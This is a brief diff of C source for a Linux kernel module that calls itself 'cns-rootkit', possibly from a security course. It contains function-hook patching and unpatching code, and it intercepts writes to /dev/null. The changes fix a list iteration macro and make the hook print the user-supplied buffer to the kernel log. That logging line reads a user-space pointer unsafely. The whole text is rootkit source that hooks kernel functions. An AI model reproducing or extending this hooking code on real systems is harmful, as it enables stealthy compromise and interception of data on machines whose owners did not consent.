@@ -71,7 +71,7 @@ void *hook_unpatch(void *modified_function) {
 void hook_remove(void *modified_function) {
   struct hook *h, *tmp;
 
-  list_for_each_safe(h, tmp, &hook_list, list) {
+  list_for_each_entry_safe(h, tmp, &hook_list, list) {
     if(h->modified_function == modified_function) {
       hook_unpatch(modified_function);
       list_del(&h->list);
@@ -90,7 +90,7 @@ int unestablish_comm_channel(void);
 ssize_t cns_rootkit_dev_null_write(struct file *, char __user *, size_t, loff_t *);
 
 ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
-  printk(KERN_INFO "cns-rootkit: In my /dev/null write\n");
+  printk(KERN_INFO "cns-rootkit: In my /dev/null write with %s\n", buf);
   ssize_t (*original_dev_null_write) (struct file *filep, char __user *buf, size_t count, loff_t *p);
   original_dev_null_write = hook_unpatch((void *) cns_rootkit_dev_null_write);
   ssize_t res =  original_dev_null_write(filep, buf, count, p);
